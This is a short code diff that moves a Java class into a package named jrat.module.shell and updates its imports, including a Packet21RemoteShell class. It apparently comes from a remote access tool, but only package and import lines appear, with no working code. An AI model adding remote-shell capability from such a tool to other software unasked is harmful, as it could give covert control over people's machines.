@@ -1,6 +1,7 @@
-package jrat.client;
+package jrat.module.shell;
 
-import jrat.client.packets.outgoing.Packet21RemoteShell;
+import jrat.client.Connection;
+import jrat.module.shell.packets.Packet21RemoteShell;
 import oslib.Shell;
 
 import java.io.BufferedReader;
